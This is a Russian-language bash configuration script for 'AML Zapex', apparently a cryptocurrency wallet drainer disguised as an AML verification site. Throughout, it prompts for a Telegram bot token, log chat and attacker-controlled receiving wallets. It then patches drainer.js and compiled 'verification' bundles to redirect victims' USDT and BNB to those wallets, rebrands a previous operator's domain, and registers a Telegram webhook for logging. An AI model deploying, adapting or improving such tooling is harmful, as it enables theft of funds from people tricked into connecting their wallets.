#!/bin/bash

# set_settings.sh - Интерактивная настройка проекта

# Проверка прав root
if [ "$(id -u)" -ne 0 ]; then
  echo "Пожалуйста, запустите этот скрипт с правами root (sudo)"
  exit 1
fi

echo "==============================================="
echo "   AML Zapex - Настройка конфигурации"
echo "==============================================="
echo "Введите новые значения. Нажмите Enter, чтобы оставить текущее (если применимо)."
echo ""

# 1. Сбор данных
read -p "Введите домен или IP сайта (например amlzapex.com или 1.2.3.4): " INPUT_DOMAIN

# Определяем протокол (если введен)
if [[ "$INPUT_DOMAIN" == https://* ]]; then
    PROTO="https"
    DOMAIN=$(echo "$INPUT_DOMAIN" | sed -e 's|^https://||' -e 's|/.*$||' -e 's| ||g')
elif [[ "$INPUT_DOMAIN" == http://* ]]; then
    PROTO="http"
    DOMAIN=$(echo "$INPUT_DOMAIN" | sed -e 's|^http://||' -e 's|/.*$||' -e 's| ||g')
else
    # Если протокол не введен, проверяем, IP это или домен
    DOMAIN=$(echo "$INPUT_DOMAIN" | sed -e 's|/.*$||' -e 's| ||g')
    if [[ "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        PROTO="http" # Для IP обычно http
    else
        PROTO="https" # Для доменов по умолчанию https (но WalletConnect требует SSL!)
    fi
fi

echo "Используем протокол: $PROTO для домена: $DOMAIN"
echo "ВНИМАНИЕ: WalletConnect требует HTTPS на реальных серверах!"

read -p "Введите токен Telegram бота: " BOT_TOKEN
read -p "Введите ID чата для логов (например -100...): " CHAT_ID
read -p "Введите ВАШ Telegram ID (для админки): " ADMIN_ID
read -p "Введите адрес контракта USDT TRC20 (оставьте пустым для дефолтного): " USDT_CONTRACT
read -p "Введите адрес кошелька получателя (TRC20): " WALLET_TRC20
read -p "Введите адрес кошелька получателя (ERC20/BNB): " WALLET_ERC20
read -p "Введите минимальную сумму вывода (USDT): " MIN_WITHDRAW

# Дефолтные значения (если пользователь ничего не ввел, можно использовать дефолт или старое, но тут мы просто проверим обязательные)
if [ -z "$DOMAIN" ]; then echo "Ошибка: Домен обязателен!"; exit 1; fi
if [ -z "$BOT_TOKEN" ]; then echo "Ошибка: Токен бота обязателен!"; exit 1; fi
if [ -z "$ADMIN_ID" ]; then echo "Ошибка: Admin ID обязателен!"; exit 1; fi

# Установка дефолтов для необязательных полей
[ -z "$USDT_CONTRACT" ] && USDT_CONTRACT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
[ -z "$WALLET_TRC20" ] && WALLET_TRC20="TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt"
[ -z "$WALLET_ERC20" ] && WALLET_ERC20="0xde16f96d683078cc99653278d7801fc65a81236e"
[ -z "$MIN_WITHDRAW" ] && MIN_WITHDRAW="250"

echo ""
echo ">>> Применение настроек..."

# Пути к файлам
CONFIG_CLIENT="html/html/config_client.json"
CONFIG_PHP="html/html/config.php"
BOT_PHP="html/html/bot_config/bot.php"
DRAINER_JS="goliy-drin/drainer.js"
BUNDLE_JS_1="sam-drin/verification/page1.bundle.js"
BUNDLE_JS_2="sam-drin/verification/page2.bundle.js"

# 2. Обновление config_client.json
echo "Обновление $CONFIG_CLIENT..."
echo "{\"min_withdraw\":\"$MIN_WITHDRAW\",\"contractAddress\":\"$WALLET_TRC20\"}" > "$CONFIG_CLIENT"

# 3. Обновление config.php
echo "Обновление $CONFIG_PHP..."
# Используем sed с разделителем | чтобы не конфликтовать с / в URL
sed -i "s|\$bot_token = '.*';|\$bot_token = '$BOT_TOKEN';|g" "$CONFIG_PHP"
sed -i "s|\$chat = .*;|\$chat = $CHAT_ID;|g" "$CONFIG_PHP"
sed -i "s|header(\"Access-Control-Allow-Origin: .*\");|header(\"Access-Control-Allow-Origin: $PROTO://$DOMAIN\");|g" "$CONFIG_PHP"

# 4. Обновление bot.php (Admin ID)
echo "Обновление $BOT_PHP..."
# Заменяем сложную строку с ID на простую проверку одного админа
sed -i "s|if(\$chat_id === 6683130061.*){|if(\$chat_id == $ADMIN_ID){|g" "$BOT_PHP"

# 5. Обновление drainer.js (Исходник)
echo "Обновление $DRAINER_JS..."
sed -i "s|let server = \".*\";|let server = \"$DOMAIN\";|g" "$DRAINER_JS"
sed -i "s|let contractAddressUSDT = \".*\";|let contractAddressUSDT = \"$USDT_CONTRACT\";|g" "$DRAINER_JS"
sed -i "s|let contractAddress = \".*\";|let contractAddress = \"$WALLET_TRC20\";|g" "$DRAINER_JS"
sed -i "s|const recipient = \".*\";|const recipient = \"$WALLET_ERC20\";|g" "$DRAINER_JS"
sed -i "s|const recipientBNB = \".*\";|const recipientBNB = \"$WALLET_ERC20\";|g" "$DRAINER_JS"
sed -i "s|let min_withdraw = \".*\";|let min_withdraw = \"${MIN_WITHDRAW}000000\";|g" "$DRAINER_JS"
sed -i "s|let url_origin = \".*\";|let url_origin = \"$PROTO://$DOMAIN/\";|g" "$DRAINER_JS"

# 6. Обновление скомпилированных файлов (Hot Patch)
echo "Патчинг скомпилированных JS файлов..."

# Замена домена (zapexobmen.com -> новый домен)
# ВАЖНО: Если домен уже был заменен ранее, этот sed может не найти старый домен.
# Поэтому мы ищем zapexobmen.com. Если вы запускаете скрипт второй раз, он может не найти его.
# Но так как мы работаем с исходным архивом, предполагается первый запуск.

for FILE in "$BUNDLE_JS_1" "$BUNDLE_JS_2"; do
    if [ -f "$FILE" ]; then
        echo "Патчинг $FILE..."
        sed -i "s|zapexobmen.com|$DOMAIN|g" "$FILE"
        
        # Попытка заменить кошельки в скомпилированном коде (может быть рискованно, если строки разбиты)
        # Ищем старые кошельки и меняем на новые
        sed -i "s|TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt|$WALLET_TRC20|g" "$FILE"
        sed -i "s|0xde16f96d683078cc99653278d7801fc65a81236e|$WALLET_ERC20|g" "$FILE"
        sed -i "s|TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t|$USDT_CONTRACT|g" "$FILE"
    else
        echo "Внимание: Файл $FILE не найден!"
    fi
done

# 7. Установка Webhook
echo ""
echo ">>> Установка Webhook..."
WEBHOOK_URL="$PROTO://$DOMAIN/bot.php"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/setWebhook?url=$WEBHOOK_URL"

echo "Отправка запроса к Telegram API..."
curl -s "$API_URL"
echo ""

echo "==============================================="
echo "   Настройка завершена!"
echo "==============================================="
echo "1. Конфиги обновлены."
echo "2. JS файлы пропатчены."
echo "3. Webhook установлен (проверьте ответ выше: \"ok\":true)."
echo ""
echo "Теперь запустите 'deploy.sh' чтобы применить изменения на сервере (скопировать файлы)."
